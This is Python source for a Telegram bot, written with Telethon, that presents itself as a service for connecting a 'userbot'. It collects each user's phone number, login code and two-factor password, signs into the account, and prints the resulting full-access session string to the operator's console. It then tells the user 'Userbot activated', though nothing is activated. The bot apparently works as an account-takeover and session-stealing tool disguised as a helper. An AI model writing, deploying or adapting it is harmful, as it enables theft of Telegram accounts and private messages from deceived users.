import asyncio
import re
import os

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# ================= BOT =================
bot = TelegramClient("bot", API_ID, API_HASH)

# user state storage
user_state = {}

# ================= PHONE VALIDATION =================
def is_valid_phone(phone: str) -> bool:
    return bool(re.match(r"^\+[1-9]\d{7,14}$", phone))

# ================= START =================
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.reply(
        "👋 Welcome!\n\n"
        "Use /login to connect your userbot."
    )

# ================= LOGIN =================
@bot.on(events.NewMessage(pattern="/login"))
async def login(event):
    user_id = event.sender_id

    user_state[user_id] = {
        "step": "phone"
    }

    await event.reply("📱 Send your phone number with country code (+91xxxxxxxxxx)")

# ================= MAIN HANDLER =================
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.raw_text or ""

    if user_id not in user_state:
        return

    state = user_state[user_id]
    step = state.get("step")

    # ================= PHONE STEP =================
    if step == "phone":
        phone = text.strip()

        if not is_valid_phone(phone):
            return await event.reply(
                "❌ Invalid phone number!\n\n✔ Correct format:\n+91xxxxxxxxxx"
            )

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await client.send_code_request(phone)

            state["phone"] = phone
            state["client"] = client
            state["step"] = "otp"

            await event.reply("📩 OTP sent!\nNow send OTP here.")

        except Exception as e:
            await event.reply(f"❌ Failed to send OTP:\n{e}")

    # ================= OTP STEP =================
    elif step == "otp":
        otp = text.strip()
        client = state.get("client")
        phone = state.get("phone")

        if not otp or not client or not phone:
            return await event.reply("❌ Session expired. Try /login again.")

        try:
            await client.sign_in(phone, otp)

        except SessionPasswordNeededError:
            state["step"] = "password"
            return await event.reply("🔐 2FA enabled!\nSend your Telegram password:")

        except Exception as e:
            return await event.reply(f"❌ OTP Error:\n{e}")

        session_str = client.session.save()

        await event.reply("✅ Login successful!\nUserbot activated.")

        print(f"\nSESSION (NO 2FA) for {user_id}:\n{session_str}\n")

        await client.disconnect()
        del user_state[user_id]

    # ================= PASSWORD STEP (2FA) =================
    elif step == "password":
        password = text.strip()
        client = state.get("client")

        if not password or not client:
            return await event.reply("❌ Invalid password or session expired.")

        try:
            await client.sign_in(password=password)

        except Exception as e:
            return await event.reply(f"❌ Wrong password:\n{e}")

        session_str = client.session.save()

        await event.reply("✅ 2FA login successful!\nUserbot activated.")

        print(f"\nSESSION (2FA) for {user_id}:\n{session_str}\n")

        await client.disconnect()
        del user_state[user_id]

# ================= RUN =================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("Bot is running...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
